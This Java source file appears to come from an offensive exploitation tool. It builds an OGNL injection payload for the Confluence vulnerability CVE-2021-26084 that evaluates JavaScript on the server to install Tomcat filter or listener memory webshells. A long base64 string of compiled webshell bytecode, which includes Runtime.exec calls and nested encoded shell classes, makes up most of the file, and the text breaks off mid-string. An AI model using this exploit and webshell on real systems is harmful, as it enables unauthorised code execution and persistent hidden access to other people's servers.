package core.payloads;

import core.GenerateMemShell;
import core.enumtypes.PayloadType;

import java.net.URLEncoder;

public class Confluence_CVE_2021_26084 {
    public static Object getObject(PayloadType type, String trojanType) throws Exception {
        byte[] bytecodes = null;
        String code = "";
        String base64CodeStr = "";
        String payloadTemplate = "queryString=\\u0027%2b#{\\u0022\\u0022[\\u0022class\\u0022].forName(\\u0022javax.script.ScriptEngineManager\\u0022).newInstance().getEngineByName(\\u0022js\\u0022).eval(\\u0022{code}\\u0022)}%2b\\u0027";
        switch (type) {
            case tomcatfiltermemshell:
                base64CodeStr = GenerateMemShell.generateMemShell("TomcatFilterMemShell", "BASE64", "6");
                break;
            case tomcatlistenermemshell:
                base64CodeStr = GenerateMemShell.generateMemShell("TomcatListenerMemShell", "BASE64", "6");
                break;
        }

//        String base64CodeStr = Util.base64Encode(bytecodes);
//        String base64CodeStr = "yv66vgAAADIBKQoAEgCHCgCIAIkIAIoKAIgAiwcAjAoABQCNCQBdAI4KAF0AjwoAXQCQCgBdAJEKAF0AkgcAkwoAEgCUCACVBwCWCgAPAJcKAJgAmQcAmgoAmACbBwCcCgAPAJ0JAF0AngoAKQCfCACgCgAPAKEKAKIAmQoAogCjCgCkAKUHAKYKAB0AhwoApwCoCwA9AKkLAKoAqwsAqgCsCgAdAK0KAKcArgkAXQCvCACwCgAdALEIALIHALMIALQHALUHALYKAA8AtwoALAC4CgC5ALoKALkAuwgAvAoAXQC9BwC+CgC5AJ0IAL8KACkAwAgAwQcAwggAwwgAxAgAxQgAxgcAxwsAPQDICwA9AMkIAMoIAMsHAMwKAA8AzQkAXQDOCADPCADQCQBdANEKACkA0ggA0wkA1ADVCgDUANYIANcIANgKALkA2QoAUQDaCgAPANsHANwIAN0HAN4IAN8KAF0A4AgA4QoADwDiCADjCADkCADlCADmCADnBwDoCgBdAIcBABBTVEFOREFSRF9DT05URVhUAQASTGphdmEvbGFuZy9PYmplY3Q7AQAIUkVTUE9OU0UBAAVFVEFHUwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAD01FTVNIRUxMX09CSkVDVAEADExpc3RlbmVyTmFtZQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAA1TdGFja01hcFRhYmxlBwDoBwCMBwCTAQAIaXNJbmplY3QBAAMoKVoHAOkBAA5pbmplY3RNZW1TaGVsbAcA6gcAxwcApgcA6wcA7AcAtQEABWdldEZWAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsHAJYHALYBAApFeGNlcHRpb25zAQASZ2V0U3RhbmRhcmRDb250ZXh0BwDtBwCzBwCaAQATaW5qZWN0TWVtU2hlbGxDbGFzcwEADGJhc2U2NERlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBABtUb21jYXRMaXN0ZW5lck1lbVNoZWxsLmphdmEMAGYAZwcA7gwA7wDwAQAIY2FsYy5leGUMAPEA8gEAE2phdmEvaW8vSU9FeGNlcHRpb24MAPMAZwwAXwBgDAB9AGcMAG4AbwwAgQBnDABxAGcBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAD0APUBABxnZXRBcHBsaWNhdGlvbkV2ZW50TGlzdGVuZXJzAQAPamF2YS9sYW5nL0NsYXNzDAD2APcHAOkMAPgA+QEAEGphdmEvbGFuZy9PYmplY3QMAPoA+wEAE1tMamF2YS9sYW5nL09iamVjdDsMAPwA/QwAZQBjDAD+AP8BACBhcHBsaWNhdGlvbkV2ZW50TGlzdGVuZXJzT2JqZWN0cwwBAAEBBwDqDAECAQMHAQQMAQUBBgEAE2phdmEvdXRpbC9BcnJheUxpc3QHAOsMAQcBCAwBCQEKBwDsDAELAG8MAQwBDQwBDgD/DAEPAG8MAGQAYAEAHHNldEFwcGxpY2F0aW9uRXZlbnRMaXN0ZW5lcnMMARABEQEAFmFkZEFwcGxpY2F0aW9uTGlzdGVuZXIBABBqYXZhL2xhbmcvU3RyaW5nAQAbYWRkQXBwbGljYXRpb25FdmVudExpc3RlbmVyAQATamF2YS9sYW5nL1Rocm93YWJsZQEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgwBEgD1DABmARMHAO0MARQBFQwBFgEXAQAHdGhyZWFkcwwAeAB5AQATW0xqYXZhL2xhbmcvVGhyZWFkOwEABGh0dHAMARgBGQEABnRhcmdldAEAEmphdmEvbGFuZy9SdW5uYWJsZQEABnRoaXMkMAEAB2hhbmRsZXIBAAZnbG9iYWwBAApwcm9jZXNzb3JzAQAOamF2YS91dGlsL0xpc3QMARoBGwwBAgEcAQADcmVxAQALZ2V0UmVzcG9uc2UBABJbTGphdmEvbGFuZy9DbGFzczsMAR0A9wwAYQBgAQAJZ2V0SGVhZGVyAQAFRXRhZ3MMAGIAYwwBHgBvAQAHZ2V0Tm90ZQcBHwwBIAEhDAEHASIBAAdjb250ZXh0AQARZ2V0U2VydmxldENvbnRleHQMASMBJAwBJQEmDAEnAQ0BABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAtkZWZpbmVDbGFzcwEAAltCASLseXY2NnZnQUFBRElCV1FvQVlBQ3lDUUJHQUxNSkFFWUF0QWdBdFFrQVJnQzJDQUMzQ1FCR0FMZ0lBTGtKQUVZQXVnY0F1d29BQ2dDeUNnQUtBTHdLQUFvQXZRb0FSZ0MrQ1FCR0FMOElBTUFKQUVZQXdRb0FZQURDQ2dCZ0FNTUlBTVFLQU1VQXhnY0F4d29BTVFESUNnQVdBTWtLQU1VQXlnb0F4UURMQndETUNBRE5DZ0RPQU04S0FERUEwQW9BemdEUkJ3RFNDZ0RPQU5NS0FDQUExQW9BSUFEVkNnQXhBTllJQU5jS0FDNEEyQWdBMlFjQTJnb0FMZ0RiQndEY0NnRGRBTjRLQURBQTN3Z0E0QWNBNFFjQWVRY0E0Z2NBNHdnQTVBb0FMZ0RsQ0FEbUNBRG5DQURvQ0FEcENBRHFDZ0RyQU93SEFPMEtBRVlBN2dnQTd3c0FPZ0R3Q0FEeENnQXhBUElMQURvQTh3c0FPZ0QwQ2dCR0FQVUtBRVlBOWdnQTl3c0ErQUQ1QndENkNnQXVBUHNLQUVZQXdnb0FSZ0Q4Q3dENEFQMElBUDRMQURvQS9RY0Evd29BVFFDeUNnQXdBUUFMQUY0QkFRb0FNUUVDQ2dFREFRUUtBREFBdlFvQVRRRUZDZ0JHQVFZS0FERUJCd2dCQ0FnQkNRb0FHd0VLQ0FCa0NnQXVBUXNLQVF3QkRRb0JEQUVPQndFUENBQmlCd0VRQndFUkFRQUhjbVZ4ZFdWemRBRUFKMHhxWVhaaGVDOXpaWEoyYkdWMEwyaDBkSEF2U0hSMGNGTmxjblpzWlhSU1pYRjFaWE4wT3dFQUNISmxjM0J2Ym5ObEFRQW9UR3BoZG1GNEwzTmxjblpzWlhRdmFIUjBjQzlJZEhSd1UyVnlkbXhsZEZKbGMzQnZibk5sT3dFQUFuaGpBUUFTVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3QVFBRFVIZGtBUUFFY0dGMGFBRUFBMjFrTlFFQUFtTnpBUUFHUEdsdWFYUStBUUFES0NsV0FRQUVRMjlrWlFFQUQweHBibVZPZFcxaVpYSlVZV0pzWlFFQUVreHZZMkZzVm1GeWFXRmliR1ZVWVdKc1pRRUFCSFJvYVhNQkFCNU1iV1Z0YzJobGJHd3ZWRzl0WTJGMFRHbHpkR1Z1WlhKVGFHVnNiRHNCQUJvb1RHcGhkbUV2YkdGdVp5OURiR0Z6YzB4dllXUmxjanNwVmdFQUFYb0JBQmRNYW1GMllTOXNZVzVuTDBOc1lYTnpURzloWkdWeU93RUFBVkVCQUJVb1cwSXBUR3BoZG1FdmJHRnVaeTlEYkdGemN6c0JBQUpqWWdFQUFsdENBUUFCZUFFQUJ5aGJRbG9wVzBJQkFBRmpBUUFWVEdwaGRtRjRMMk55ZVhCMGJ5OURhWEJvWlhJN0FRQUVkbUZ5TkFFQUZVeHFZWFpoTDJ4aGJtY3ZSWGhqWlhCMGFXOXVPd0VBQVhNQkFBRnRBUUFCV2dFQURWTjBZV05yVFdGd1ZHRmliR1VIQVBvSEFSSUhBTXdCQUNZb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tVeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk93RUFIVXhxWVhaaEwzTmxZM1Z5YVhSNUwwMWxjM05oWjJWRWFXZGxjM1E3QVFBRGNtVjBCd0RqQVFBTVltRnpaVFkwUlc1amIyUmxBUUFXS0Z0Q0tVeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk93RUFCMFZ1WTI5a1pYSUJBQkpNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNCQUFaaVlYTmxOalFCQUJGTWFtRjJZUzlzWVc1bkwwTnNZWE56T3dFQUJIWmhjallCQUFKaWN3RUFCWFpoYkhWbEFRQUtSWGhqWlhCMGFXOXVjd0VBREdKaGMyVTJORVJsWTI5a1pRRUFGaWhNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNwVzBJQkFBZGtaV052WkdWeUFRQVFjbVZ4ZFdWemRFUmxjM1J5YjNsbFpBRUFKaWhNYW1GMllYZ3ZjMlZ5ZG14bGRDOVRaWEoyYkdWMFVtVnhkV1Z6ZEVWMlpXNTBPeWxXQVFBRGNtVnhBUUFqVEdwaGRtRjRMM05sY25ac1pYUXZVMlZ5ZG14bGRGSmxjWFZsYzNSRmRtVnVkRHNCQUJKeVpYRjFaWE4wU1c1cGRHbGhiR2w2WldRQkFBWmhjbkpQZFhRQkFCOU1hbUYyWVM5cGJ5OUNlWFJsUVhKeVlYbFBkWFJ3ZFhSVGRISmxZVzA3QVFBQlpnRUFCM05sYzNOcGIyNEJBQ0JNYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWE56YVc5dU93RUFCR1JoZEdFQkFBUjJZWEk1QndFVEJ3RHRCd0VQQndFVUFRQVdaMlYwVW1WemNHOXVjMlZHY205dFVtVnhkV1Z6ZEFFQVVTaE1hbUYyWVhndmMyVnlkbXhsZEM5b2RIUndMMGgwZEhCVFpYSjJiR1YwVW1WeGRXVnpkRHNwVEdwaGRtRjRMM05sY25ac1pYUXZhSFIwY0M5SWRIUndVMlZ5ZG14bGRGSmxjM0J2Ym5ObE93RUFCSFpoY2pNQkFCbE1hbUYyWVM5c1lXNW5MM0psWm14bFkzUXZSbWxsYkdRN0FRQUVkbUZ5TlFFQUJIWmhjamdCQUFSMllYSXhBUUFFZG1GeU1nRUFDbE52ZFhKalpVWnBiR1VCQUJoVWIyMWpZWFJNYVhOMFpXNWxjbE5vWld4c0xtcGhkbUVNQUd3QWJRd0FZZ0JqREFCa0FHVUJBQkF6WXpabE1HSTRZVGxqTVRVeU1qUmhEQUJtQUdjQkFBUndRVk16REFCb0FHY0JBQkF2Wm1GMmFXTnZibVJsYlc4dWFXTnZEQUJwQUdjQkFCZHFZWFpoTDJ4aGJtY3ZVM1J5YVc1blFuVnBiR1JsY2d3QkZRRVdEQUVYQVJnTUFHb0Fod3dBYWdCbkFRQUZWVlJHTFRnTUFHc0Fad3dBYkFCekRBRVpBUm9CQUFOQlJWTUhBUklNQVJzQkhBRUFIMnBoZG1GNEwyTnllWEIwYnk5emNHVmpMMU5sWTNKbGRFdGxlVk53WldNTUFSMEJIZ3dBYkFFZkRBRWdBU0VNQVNJQkl3RUFFMnBoZG1FdmJHRnVaeTlGZUdObGNIUnBiMjRCQUFOTlJEVUhBU1FNQVJzQkpRd0JKZ0VuREFFb0FTa0JBQlJxWVhaaEwyMWhkR2d2UW1sblNXNTBaV2RsY2d3QktnRWVEQUJzQVNzTUFSY0JMQXdCTFFFWUFRQVFhbUYyWVM1MWRHbHNMa0poYzJVMk5Bd0JMZ0V2QVFBS1oyVjBSVzVqYjJSbGNnRUFFbHRNYW1GMllTOXNZVzVuTDBOc1lYTnpPd3dCTUFFeEFRQVRXMHhxWVhaaEwyeGhibWN2VDJKcVpXTjBPd2NCTWd3Qk13RTBEQUUxQVRZQkFBNWxibU52WkdWVWIxTjBjbWx1WndFQUQycGhkbUV2YkdGdVp5OURiR0Z6Y3dFQUVHcGhkbUV2YkdGdVp5OVBZbXBsWTNRQkFCQnFZWFpoTDJ4aGJtY3ZVM1J5YVc1bkFRQVdjM1Z1TG0xcGMyTXVRa0ZUUlRZMFJXNWpiMlJsY2d3Qk53RTRBUUFHWlc1amIyUmxBUUFLWjJWMFJHVmpiMlJsY2dFQUJtUmxZMjlrWlFFQUZuTjFiaTV0YVhOakxrSkJVMFUyTkVSbFkyOWtaWElCQUF4a1pXTnZaR1ZDZFdabVpYSUhBUk1NQVRrQk9nRUFKV3BoZG1GNEwzTmxjblpzWlhRdmFIUjBjQzlJZEhSd1UyVnlkbXhsZEZKbGNYVmxjM1FNQUtnQXFRRUFFRmd0VW1WeGRXVnpkR1ZrTFZkcGRHZ01BVHNBaHdFQURsaE5URWhVVkZCU1pYRjFaWE4wREFFOEFUME1BVDRCUHd3QlFBQ0hEQUNWQUpZTUFIb0Fld0VBQjNCaGVXeHZZV1FIQVJRTUFVRUJRZ0VBSEcxbGJYTm9aV3hzTDFSdmJXTmhkRXhwYzNSbGJtVnlVMmhsYkd3TUFVTUJSQXdBZGdCM0RBRkZBVVlCQUFwd1lYSmhiV1YwWlhKekFRQWRhbUYyWVM5cGJ5OUNlWFJsUVhKeVlYbFBkWFJ3ZFhSVGRISmxZVzBNQVVjQlNBd0JTUUZLREFGTEFVd0hBVTBNQVU0QlR3d0JVQUVlREFDTEFJd01BVXNCTEFFQURsaHRiRWhVVkZCU1pYRjFaWE4wQVFBSFUzVmpZMlZ6Y3d3QlVRQnREQUZTQVZNSEFWUU1BVlVCVmd3QlZ3RllBUUFtYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWEoyYkdWMFVtVnpjRzl1YzJVQkFCVnFZWFpoTDJ4aGJtY3ZRMnhoYzNOTWIyRmtaWElCQUNScVlYWmhlQzl6WlhKMmJHVjBMMU5sY25ac1pYUlNaWEYxWlhOMFRHbHpkR1Z1WlhJQkFCTnFZWFpoZUM5amNubHdkRzh2UTJsd2FHVnlBUUFoYW1GMllYZ3ZjMlZ5ZG14bGRDOVRaWEoyYkdWMFVtVnhkV1Z6ZEVWMlpXNTBBUUFlYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWE56YVc5dUFRQUdZWEJ3Wlc1a0FRQXRLRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOXNZVzVuTDFOMGNtbHVaMEoxYVd4a1pYSTdBUUFJZEc5VGRISnBibWNCQUJRb0tVeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk93RUFDMlJsWm1sdVpVTnNZWE56QVFBWEtGdENTVWtwVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjenNCQUF0blpYUkpibk4wWVc1alpRRUFLU2hNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNwVEdwaGRtRjRMMk55ZVhCMGJ5OURhWEJvWlhJN0FRQUlaMlYwUW5sMFpYTUJBQVFvS1Z0Q0FRQVhLRnRDVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1ZZQkFBUnBibWwwQVFBWEtFbE1hbUYyWVM5elpXTjFjbWwwZVM5TFpYazdLVllCQUFka2IwWnBibUZzQVFBR0tGdENLVnRDQVFBYmFtRjJZUzl6WldOMWNtbDBlUzlOWlhOellXZGxSR2xuWlhOMEFRQXhLRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOXpaV04xY21sMGVTOU5aWE56WVdkbFJHbG5aWE4wT3dFQUJteGxibWQwYUFFQUF5Z3BTUUVBQm5Wd1pHRjBaUUVBQnloYlFrbEpLVllCQUFaa2FXZGxjM1FCQUFZb1NWdENLVllCQUJVb1NTbE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c0JBQXQwYjFWd2NHVnlRMkZ6WlFFQUIyWnZjazVoYldVQkFDVW9UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBUUFKWjJWMFRXVjBhRzlrQVFCQUtFeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk8xdE1hbUYyWVM5c1lXNW5MME5zWVhOek95bE1hbUYyWVM5c1lXNW5MM0psWm14bFkzUXZUV1YwYUc5a093RUFHR3BoZG1FdmJHRnVaeTl5Wldac1pXTjBMMDFsZEdodlpBRUFCbWx1ZG05clpRRUFPU2hNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHRiVEdwaGRtRXZiR0Z1Wnk5UFltcGxZM1E3S1V4cVlYWmhMMnhoYm1jdlQySnFaV04wT3dFQUNHZGxkRU5zWVhOekFRQVRLQ2xNYW1GMllTOXNZVzVuTDBOc1lYTnpPd0VBQzI1bGQwbHVjM1JoYm1ObEFRQVVLQ2xNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNCQUJGblpYUlRaWEoyYkdWMFVtVnhkV1Z6ZEFFQUlDZ3BUR3BoZG1GNEwzTmxjblpzWlhRdlUyVnlkbXhsZEZKbGNYVmxjM1E3QVFBSloyVjBTR1ZoWkdWeUFRQUhhVzVrWlhoUFpnRUFGU2hNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNwU1FFQUNtZGxkRk5sYzNOcGIyNEJBQ0lvS1V4cVlYWmhlQzl6WlhKMmJHVjBMMmgwZEhBdlNIUjBjRk5sYzNOcGIyNDdBUUFNWjJWMFVHRnlZVzFsZEdWeUFRQU1aMlYwUVhSMGNtbGlkWFJsQVFBbUtFeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc0JBQTVuWlhSRGJHRnpjMHh2WVdSbGNnRUFHU2dwVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjMHh2WVdSbGNqc0JBQXh6WlhSQmRIUnlhV0oxZEdVQkFDY29UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdUR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdLVllCQUFabGNYVmhiSE1CQUJVb1RHcGhkbUV2YkdGdVp5OVBZbXBsWTNRN0tWb0JBQWxuWlhSWGNtbDBaWElCQUJjb0tVeHFZWFpoTDJsdkwxQnlhVzUwVjNKcGRHVnlPd0VBQ1hOMVluTjBjbWx1WndFQUZpaEpTU2xNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNCQUJOcVlYWmhMMmx2TDFCeWFXNTBWM0pwZEdWeUFRQUZkM0pwZEdVQkFCVW9UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVllCQUF0MGIwSjVkR1ZCY25KaGVRRUFEM0J5YVc1MFUzUmhZMnRVY21GalpRRUFFR2RsZEVSbFkyeGhjbVZrUm1sbGJHUUJBQzBvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1V4cVlYWmhMMnhoYm1jdmNtVm1iR1ZqZEM5R2FXVnNaRHNCQUJkcVlYWmhMMnhoYm1jdmNtVm1iR1ZqZEM5R2FXVnNaQUVBRFhObGRFRmpZMlZ6YzJsaWJHVUJBQVFvV2lsV0FRQURaMlYwQVFBbUtFeHFZWFpoTDJ4aGJtY3ZUMkpxWldOME95bE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc0FJUUJHQUdBQUFRQmhBQWNBQVFCaUFHTUFBQUFCQUdRQVpRQUFBQUFBWmdCbkFBQUFBUUJvQUdjQUFBQUJBR2tBWndBQUFBQUFhZ0JuQUFBQUFRQnJBR2NBQUFBS0FBRUFiQUJ0QUFFQWJnQUFBSkFBQXdBQkFBQUFSaXEzQUFFcUFiVUFBaW9CdFFBREtoSUV0UUFGS2hJR3RRQUhLaElJdFFBSktyc0FDbG0zQUFzcXRBQUh0Z0FNS3JRQUJiWUFETFlBRGJnQURyVUFEeW9TRUxVQUViRUFBQUFDQUc4QUFBQW1BQWtBQUFBWkFBUUFFUUFKQUJJQURnQVRBQlFBRkFBYUFCVUFJQUFhQUQ4QUd3QkZBQndBY0FBQUFBd0FBUUFBQUVZQWNRQnlBQUFBQVFCc0FITUFBUUJ1QUFBQW13QURBQUlBQUFCSEtpdTNBQklxQWJVQUFpb0J0UUFES2hJRXRRQUZLaElHdFFBSEtoSUl0UUFKS3JzQUNsbTNBQXNxdEFBSHRnQU1LclFBQmJZQURMWUFEYmdBRHJVQUR5b1NFTFVBRWJFQUFBQUNBRzhBQUFBbUFBa0FBQUFnQUFVQUVRQUtBQklBRHdBVEFCVUFGQUFiQUJVQUlRQWhBRUFBSWdCR0FDTUFjQUFBQUJZQUFnQUFBRWNBY1FCeUFBQUFBQUJIQUhRQWRRQUJBQUVBZGdCM0FBRUFiZ0FBQUQwQUJBQUNBQUFBQ1NvckF5dSt0d0FUc0FBQUFBSUFid0FBQUFZQUFRQUFBQ1lBY0FBQUFCWUFBZ0FBQUFrQWNRQnlBQUFBQUFBSkFIZ0FlUUFCQUFFQWVnQjdBQUVBYmdBQUFOZ0FCZ0FFQUFBQUxCSVV1QUFWVGkwY21RQUhCS2NBQkFXN0FCWlpLclFBQmJZQUZ4SVV0d0FZdGdBWkxTdTJBQnF3VGdHd0FBRUFBQUFvQUNrQUd3QURBRzhBQUFBV0FBVUFBQUFyQUFZQUxBQWpBQzBBS1FBdUFDb0FMd0J3QUFBQU5BQUZBQVlBSXdCOEFIMEFBd0FxQUFJQWZnQi9BQU1BQUFBc0FIRUFjZ0FBQUFBQUxBQ0FBSGtBQVFBQUFDd0FnUUNDQUFJQWd3QUFBRHdBQS84QUR3QUVCd0NFQndBdkFRY0FoUUFCQndDRi93QUFBQVFIQUlRSEFDOEJCd0NGQUFJSEFJVUIvd0FZQUFNSEFJUUhBQzhCQUFFSEFJWUFDUUJxQUljQUFRQnVBQUFBcHdBRUFBTUFBQUF3QVV3U0hMZ0FIVTBzS3JZQUZ3TXF0Z0FldGdBZnV3QWdXUVFzdGdBaHR3QWlFQkMyQUNPMkFDUk1wd0FFVFN1d0FBRUFBZ0FxQUMwQUd3QURBRzhBQUFBZUFBY0FBQUEwQUFJQU53QUlBRGdBRlFBNUFDb0FPd0F0QURvQUxnQTlBSEFBQUFBZ0FBTUFDQUFpQUlFQWlBQUNBQUFBTUFDQUFHY0FBQUFDQUM0QWlRQm5BQUVBZ3dBQUFCTUFBdjhBTFFBQ0J3Q0tCd0NLQUFFSEFJWUFBQWtBaXdDTUFBSUFiZ0FBQVVrQUJnQUZBQUFBZUFGTUVpVzRBQ1pOTEJJbkFjQUFLTFlBS1N3QndBQXF0Z0FyVGkyMkFDd1NMUVM5QUM1WkF4SXZVN1lBS1MwRXZRQXdXUU1xVTdZQUs4QUFNVXluQURsT0VqSzRBQ1pOTExZQU16b0VHUVMyQUN3U05BUzlBQzVaQXhJdlU3WUFLUmtFQkwwQU1Ga0RLbE8yQUN2QUFERk1wd0FGT2dRcnNBQUNBQUlBUFFCQUFCc0FRUUJ4QUhRQUd3QURBRzhBQUFBeUFBd0FBQUJCQUFJQVJRQUlBRVlBR3dCSEFEMEFUd0JBQUVnQVFRQktBRWNBU3dCTkFFd0FjUUJPQUhRQVRRQjJBRkVBY0FBQUFFZ0FCd0FiQUNJQWpRQ09BQU1BQ0FBNEFJOEFrQUFDQUUwQUpBQ05BSTRBQkFCSEFDMEFqd0NRQUFJQVFRQTFBSkVBZndBREFBQUFlQUNTQUhrQUFBQUNBSFlBa3dCbkFBRUFnd0FBQUNrQUEvOEFRQUFDQndBdkJ3Q0tBQUVIQUliL0FETUFCQWNBTHdjQWlnQUhBSVlBQVFjQWh2a0FBUUNVQUFBQUJBQUJBQnNBQ1FDVkFKWUFBZ0J1QUFBQlZRQUdBQVVBQUFDRUFVd1NKYmdBSmswc0VqVUJ3QUFvdGdBcExBSEFBQ3EyQUN0T0xiWUFMQkkyQkwwQUxsa0RFakZUdGdBcExRUzlBREJaQXlwVHRnQXJ3QUF2d0FBdndBQXZUS2NBUDA0U043Z0FKazBzdGdBek9nUVpCTFlBTEJJNEJMMEFMbGtERWpGVHRnQXBHUVFFdlFBd1dRTXFVN1lBSzhBQUw4QUFMOEFBTDB5bkFBVTZCQ3V3QUFJQUFnQkRBRVlBR3dCSEFIMEFnQUFiQUFNQWJ3QUFBRElBREFBQUFGVUFBZ0JaQUFnQVdnQWJBRnNBUXdCakFFWUFYQUJIQUY0QVRRQmZBRk1BWUFCOUFHSUFnQUJoQUlJQVpRQndBQUFBU0FBSEFCc0FLQUNYQUk0QUF3QUlBRDRBandDUUFBSUFVd0FxQUpjQWpnQUVBRTBBTXdDUEFKQUFBZ0JIQURzQWtRQi9BQU1BQUFDRUFKSUFad0FBQUFJQWdnQ1RBSGtBQVFDREFBQUFLUUFEL3dCR0FBSUhBSW9IQUM4QUFRY0FodjhBT1FBRUJ3Q0tCd0F2QUFjQWhnQUJCd0NHK1FBQkFKUUFBQUFFQUFFQUd3QUJBSmdBbVFBQkFHNEFBQUExQUFBQUFnQUFBQUd4QUFBQUFnQnZBQUFBQmdBQkFBQUFhd0J3QUFBQUZnQUNBQUFBQVFCeEFISUFBQUFBQUFFQW1nQ2JBQUVBQVFDY0FKa0FBUUJ1QUFBQ0tBQUZBQWdBQUFFZEs3WUFPY0FBT2swcUxMWUFPMDRzRWp5NUFEMENBTVlBMXl3U1BMa0FQUUlBRWo2MkFEOENud0RHTExrQVFBRUFPZ1FzS3JRQUI3a0FRUUlBdUFCQ09nVXFHUVVEdGdCRE9nVVpCQkpFdVFCRkFnREhBQ0laQkJKRXV3QkdXU3EyQUN5MkFFZTNBRWdaQmJZQVNia0FTZ01BcHdCNExCSkxHUVc1QUV3REFMc0FUVm0zQUU0NkJoa0VFa1M1QUVVQ0FNQUFMcllBTXpvSEdRY1pCcllBVDFjWkJ4a0Z0Z0JQVnkyNUFGQUJBQ3EwQUE4REVCQzJBRkcyQUZJWkI3WUFVMWN0dVFCUUFRQXFHUWEyQUZRRXRnQkR1QUJWdGdCU0xia0FVQUVBS3JRQUR4QVF0Z0JXdGdCU3B3QXFMQkk4dVFBOUFnREdBQjhzRWp5NUFEMENBQkpYdGdBL0FwOEFEaTI1QUZBQkFCSll0Z0JTcHdBSVRTeTJBRm14QUFFQUFBRVVBUmNBR3dBREFHOEFBQUJpQUJnQUFBQndBQWdBY1FBT0FISUFLZ0J6QURJQWRRQkJBSFlBU2dCM0FGWUFlQUIxQUhvQWZ3QjdBSWdBZkFDWkFIMEFvUUIrQUtrQWZ3QzhBSUFBd2dDQkFOZ0FnZ0RxQUlRQTdRQ0ZBUWtBaGdFVUFJb0JGd0NJQVJnQWlRRWNBSTBBY0FBQUFGd0FDUUNJQUdJQW5RQ2VBQVlBbVFCUkFKOEFqZ0FIQURJQXVBQ2dBS0VBQkFCQkFLa0FvZ0I1QUFVQUNBRU1BR0lBWXdBQ0FBNEJCZ0JrQUdVQUF3RVlBQVFBb3dCL0FBSUFBQUVkQUhFQWNnQUFBQUFCSFFDYUFKc0FBUUNEQUFBQUp3QUcvd0IxQUFZSEFJUUhBS1FIQUtVSEFLWUhBS2NIQUM4QUFQa0FkQUw1QUNaQ0J3Q0dCQUFoQUtnQXFRQUJBRzRBQUFGSEFBSUFCd0FBQUZzQlRTdTJBQ3dTV3JZQVcwNHRCTFlBWEMwcnRnQmR3QUJlVGFjQVAwNHJ0Z0FzRWwrMkFGczZCQmtFQkxZQVhCa0VLN1lBWFRvRkdRVzJBQ3dTV3JZQVd6b0dHUVlFdGdCY0dRWVpCYllBWGNBQVhrMm5BQVU2QkN5d0FBSUFBZ0FhQUIwQUd3QWVBRlFBVndBYkFBTUFid0FBQUQ0QUR3QUFBSkFBQWdDVEFBd0FsQUFSQUpVQUdnQ2dBQjBBbGdBZUFKZ0FLUUNaQUM4QW1nQTNBSnNBUXdDY0FFa0FuUUJVQUo4QVZ3Q2VBRmtBb2dCd0FBQUFVZ0FJQUF3QURnQ3FBS3NBQXdBcEFDc0FmZ0NyQUFRQU53QWRBS3dBamdBRkFFTUFFUUNSQUtzQUJnQWVBRHNBclFCL0FBTUFBQUJiQUhFQWNnQUFBQUFBV3dDdUFHTUFBUUFDQUZrQXJ3QmxBQUlBZ3dBQUFDNEFBLzhBSFFBREJ3Q0VCd0NsQndDbUFBRUhBSWIvQURrQUJBY0FoQWNBcFFjQXBnY0FoZ0FCQndDRytnQUJBQUVBc0FBQUFBSUFzUT09DACCAIMBABBqYXZhLnV0aWwuQmFzZTY0DAEoASYBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgEAHG1lbXNoZWxsLlRvbWNhdExpc3RlbmVyU2hlbGwBABZUb21jYXRMaXN0ZW5lck1lbVNoZWxsAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBABFqYXZhL2xhbmcvQm9vbGVhbgEAEmphdmEvdXRpbC9JdGVyYXRvcgEAEGphdmEvbGFuZy9UaHJlYWQBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARZ2V0RGVjbGFyZWRN